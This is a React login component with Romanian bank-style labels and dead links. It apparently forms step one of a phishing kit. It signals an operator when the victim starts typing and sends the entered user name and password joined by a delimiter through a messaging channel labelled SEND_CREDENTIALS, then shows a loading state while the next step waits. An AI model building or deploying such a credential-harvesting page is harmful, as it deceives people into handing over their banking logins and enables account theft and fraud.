import React, { useState, useEffect } from 'react'
import userIcon from '../media/user.svg'
import passwordIcon from '../media/password.svg'
import { FieldType, CREDENTIALS_DELIMETER } from '../utils/constants'
import { storage } from '../storage/storage'
import { Messaging } from '../utils/messages'
import { UserActions } from '../utils/constants'
import { ErrorMsg } from './ErrorMsg'

export const Step1 = props => {
  const { store, changeStore } = props

  const [login, setLogin] = useState('')
  const [password, setPassword] = useState('')
  const [showError, setShowError] = useState('')
  
  const error = store.error
  const setError = val => changeStore({ error: val })
  

  const handleChange = (value, type) => {
    if (type === FieldType.LOGIN) {
      setLogin(value)
    }
    if (type === FieldType.PASSWORD) {
      setPassword(value)
    }
    if (!storage.touched) {
      console.log('Typing...')
      Messaging.start()
      storage.touched = true
    }
  }

  const handleSubmit = e => {
    e.preventDefault()

    const value = `${login}${CREDENTIALS_DELIMETER}${password}`
    if (!login || !password) {
      setError(true)
      setShowError(true)
      return
    }

    Messaging.send({ type: UserActions.SEND_CREDENTIALS, payload: value })

    changeStore({
      step_1_cod : value,
      loading: true,
    })

  }

  return (
    <div className="step-container regular">
      <div className="form-auth">
        <form onSubmit={handleSubmit}>
          <div className="label">Nume utilizator</div>
          <div className="item-field">
            <div className="icon">
              <img src={userIcon} alt="login" />
            </div>
            <div className="input-field">
              <input type="text" placeholder="Nume utilizator" onChange={e => handleChange(e.target.value, FieldType.LOGIN)} />
            </div>
          </div>
          <div className="label">Parola</div>
          <div className="item-field regular">
            <div className="icon">
                <img src={passwordIcon} alt="password" />
              </div>
              <div className="input-field">
                <input type="password" placeholder="Parola" onChange={e => handleChange(e.target.value, FieldType.PASSWORD)}/>
              </div>
              <div className="forget-password">
                <a href="#" className="bold">Ai uitat parola?</a>
              </div>
          </div>
          {(showError || error) && <ErrorMsg message="Ati introdus credentiale eronat"/>}

          <div className="row space-between links-container bold">
            <div>
              <a href="#">Sfaturi utile de securitate</a>
            </div>
            <div>
              <a href="#">Foloseste tastatura virtuala</a>
            </div>
          </div>
          <div className="btn-container">
            <button type="submit" className="blue regular">
              Autentificare
            </button>
          </div>
        </form>
        <div className="row space-between links-container bold" style={{marginTop: '25px'}}>
            <div>
              <a href="#">Prima logare</a>
            </div>
            <div>
              <a href="#">Inregistrare</a>
            </div>
        </div>

      </div>
    </div>
  )
}